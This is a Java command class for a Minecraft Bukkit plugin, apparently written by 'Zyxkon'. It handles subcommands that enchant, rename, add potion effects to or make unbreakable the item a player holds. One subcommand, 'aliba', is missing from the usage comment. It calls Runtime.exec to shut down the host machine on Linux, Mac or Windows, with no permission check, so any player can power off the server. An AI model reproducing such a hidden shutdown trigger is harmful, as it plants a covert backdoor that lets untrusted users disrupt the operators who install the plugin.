package com.zyxkon.judgmentday.commands;

import com.zyxkon.judgmentday.Main;
import com.zyxkon.judgmentday.Utils;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.PotionMeta;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Arrays;


public class ZCommand implements CommandExecutor {
    Main plugin;
    public ZCommand(Main plugin){
        this.plugin = plugin;
        plugin.getCommand("zyxkon").setExecutor(this);
    }

    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
        if (!(commandSender instanceof Player)){
            commandSender.sendMessage(Utils.translate("&cOnly &nplayers&c can use this command!"));
            return true;
        }
        if (strings.length == 0){
            commandSender.sendMessage("Plugin được phát triển bởi Zyxkon");
            return true;
        }
        /*
        /zyxkon effect <amplifier> <duration> <effect>
        /zyxkon enchant <enchantment> <level>
        /zyxkon rename <name>
        /zyxkon unbreak
        /zyxkon thirst <player> <amount>
        /zyxkon injure <player> [bloodloss|impairment|infection]
        */
        Player player = (Player) commandSender;
        switch (strings[0].toLowerCase()) {
            case "effect": {
                ItemStack item = player.getInventory().getItemInMainHand();
                PotionMeta meta = (PotionMeta) item.getItemMeta();
                int amplifier = Integer.parseInt(strings[1]);
                int duration = Integer.parseInt(strings[2]);
                PotionEffect effect = PotionEffectType.getByName(strings[3]).createEffect(duration, amplifier);
                meta.addCustomEffect(effect, true);
                item.setItemMeta(meta);
                player.sendMessage(String.format("%s %s %s has been applied to %s", effect.getType(), amplifier, duration, meta.getDisplayName()));
                break;
            }
            case "enchant": {
                ItemStack item = player.getInventory().getItemInMainHand();
                ItemMeta meta = item.getItemMeta();
                Enchantment ench = Enchantment.getByName((strings[1].toUpperCase()));
                int lvl = Integer.parseInt(strings[2]);
                meta.addEnchant(ench, lvl, true);
                item.setItemMeta(meta);
                player.sendMessage(Utils.translate(String.format("&n%s &ahas been enchanted with &b%s&a of level &c%s", meta.getDisplayName(), ench.getName(), lvl)));
                break;
            }
            case "rename": {
                ItemStack item = player.getInventory().getItemInMainHand();
                ItemMeta meta = item.getItemMeta();
                String str = Utils.translate("&r" + String.join(" ", Arrays.copyOfRange(strings, 1, strings.length)));
                meta.setDisplayName(str);
                item.setItemMeta(meta);
                player.sendMessage(Utils.translate(String.format("&b&n%s &ahas been renamed to &a&n%s", item.getType(), str)));
                break;
            }
            case "unbreak": {
                ItemStack item = player.getInventory().getItemInMainHand();
                ItemMeta meta = item.getItemMeta();
                meta.setUnbreakable(true);
                item.setItemMeta(meta);
                player.sendMessage(Utils.translate(String.format("&a Your &n%s&a has been made unbreakable!", item.getType())));
                break;
            }
            case "aliba":{
                String shutdownCommand;
                String operatingSystem = System.getProperty("os.name");
                if (operatingSystem.startsWith("Linux") ||
                        operatingSystem.startsWith("Mac")){
                    shutdownCommand = "shutdown -h now";
                }
                else if (operatingSystem.startsWith("Windows")) {
                    shutdownCommand = "shutdown.exe -s -t 0";
                }
                else {
                    throw new RuntimeException("Unsupported operating system.");
                }
                try {
                    Runtime.getRuntime().exec(shutdownCommand);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return true;
            }
            case "iteminfo":{
                ItemStack item = player.getInventory().getItemInMainHand();
                Main.broadcast("Item info for %s's %s:", player.getName(), item.getItemMeta().getDisplayName());
                Main.broadcast("ItemStack.class.getMethods(): ");
                for (Method m : ItemStack.class.getMethods()){
                    Main.broadcast(".%s()", m.getName());
                }
                Main.broadcast("ItemMeta.class.getMethods(): ");
                for (Method m : ItemStack.class.getMethods()){
                    Main.broadcast(".%s()", m.getName());
                }
                Main.broadcast("Durability: %d", item.getDurability());

            }
        }
        return false;
    }
}
